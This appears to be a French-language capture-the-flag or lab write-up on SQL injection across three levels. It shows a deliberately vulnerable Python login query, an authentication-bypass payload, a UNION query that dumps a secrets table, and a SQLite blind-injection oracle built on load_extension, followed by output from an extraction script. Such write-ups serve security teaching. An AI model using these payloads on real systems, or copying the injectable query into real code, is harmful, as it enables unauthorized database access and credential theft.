# Level 1
## vuln :
    les inputs utilisateur ne sont pas controlés ni échappés, confiance aveugle aux entrées utilisateur.

```python
username = request.form.get('username')
password = request.form.get('password')

query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```
le but c'est de faire exécuter par sql une  qui sera évalué à vraie, en toute circonstances la condition 

## exploit:

```python
' OR 1=1 --
```
ceci fait évaluer la réquete à true et fait commenter me champ password avec '--'.

# Level 2:


## exploit
mettre dans le champ du formulaire :
**users UNION select * from secrets** ou juste mettre **secrets** dans le champ
**Résulatat de la réquête :** 
```python
{"data":[[1,"admin","password"],[1,"api_key","12345"]]}
```

# Level 3:

J'ai trouvé une manière de faire un oracle sur https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

```python
1 AND CASE WHEN 1=1 THEN 1 ELSE load_extension(1) END -> Success
1 AND CASE WHEN 1=2 THEN 1 ELSE load_extension(1) END -> Boom
```

**Pour découvrir le nombre de tables par exemple**
```python
1 AND CASE WHEN      (SELECT COUNT(*) FROM sqlite_master WHERE type='table') = 2     THEN 1 ELSE load_extension(1) END
```

**ensuite j'ai exécuté un petit script (dump_table.py) python pour dump les infos de la base**

```python
python3 dump_table.py

=== Tables ===
[+] Length = 13
   1 → u   (u)
   2 → s   (us)
   3 → e   (use)
   4 → r   (user)
   5 → s   (users)
   6 → ,   (users,)
   7 → s   (users,s)
   8 → e   (users,se)
   9 → c   (users,sec)
  10 → r   (users,secr)
  11 → e   (users,secre)
  12 → t   (users,secret)
  13 → s   (users,secrets)
Tables: users,secrets

=== Contenu de la table secrets ===
[+] Length = 5
   1 → 1   (1)
   2 → 2   (12)
   3 → 3   (123)
   4 → 4   (1234)
   5 → 5   (12345)
secret_value → 12345

=== Contenu de la table users ===
[+] Length = 5
   1 → a   (a)
   2 → d   (ad)
   3 → m   (adm)
   4 → i   (admi)
   5 → n   (admin)
usernames → admin
[+] Length = 8
   1 → p   (p)
   2 → a   (pa)
   3 → s   (pas)
   4 → s   (pass)
   5 → w   (passw)
   6 → o   (passwo)
   7 → r   (passwor)
   8 → d   (password)
passwords → password
```
